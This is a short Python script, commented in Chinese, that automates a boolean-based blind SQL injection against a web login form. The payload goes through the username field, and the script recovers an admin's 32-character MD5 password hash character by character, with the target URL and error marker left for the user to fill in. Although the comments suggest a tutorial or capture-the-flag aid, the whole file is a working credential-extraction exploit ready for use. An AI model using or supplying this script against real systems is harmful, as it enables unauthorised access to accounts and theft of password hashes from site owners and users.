import requests  # http库

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'] # 定义循环范围，md5的hash范围是数字0~9,字母a~f,长度为16或者32，这里试的是32

def sql(i,c):   #定义跑sql注入密码的函数，i和c俩变量，c是上面的char，i是下面的密码第几位
    return "admin' and substr(password,%s,1) = '%s'-- -" % (i,c)  # 这是sql注入的语句，%s是占位符，把i和c插进去。

for i in range(1,33):      #i是密码第几位，range为范围，最后一位不算，所以是1到32，开始循环
    for c in chars:      #双循环，把c也带入进来
        sqlinjection = sql(i,c)
        payload = {'username': sqlinjection, 'password': 'password'}  #这是在登录框，账号名开始注入，密码被注释了故随便填
        req = requests.post('http://',data = payload)    #这是post请求连接http，登录框的网址自己填，开始注入
        if "xxxxx" in req.text:   #这是判断，如果密码错误报错了出现什么样的文字提示（自己根据情况填）
            print(c,end ='',flush = True)  #循环打印c也就是MD5值，end空白符是一个接着一个排序，flush是显示更新内容到屏幕
            break #报错了就停止循环

print()  #最终打印,拿去解密
